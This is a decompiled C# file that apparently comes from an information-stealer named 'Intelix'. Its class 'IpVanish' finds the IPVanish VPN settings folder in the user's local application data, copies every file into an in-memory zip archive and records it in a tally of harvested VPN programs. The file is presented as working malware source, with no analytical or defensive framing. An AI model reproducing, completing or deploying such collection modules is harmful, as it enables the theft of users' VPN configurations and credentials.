using System;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.Vpn
{
	// Token: 0x0200000C RID: 12
	public class IpVanish : ITarget
	{
		// Token: 0x0600002A RID: 42 RVA: 0x00002CC0 File Offset: 0x00000EC0
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "IPVanish", "Settings");
			bool flag = Directory.Exists(text);
			if (flag)
			{
				string text2 = "IPVanish";
				Counter.CounterApplications counterApplications = new Counter.CounterApplications();
				counterApplications.Name = "IPVanish";
				zip.AddDirectoryFiles(text, text2, true);
				counterApplications.Files.Add(text + " => " + text2);
				counterApplications.Files.Add(text2);
				counter.Vpns.Add(counterApplications);
			}
		}
	}
}
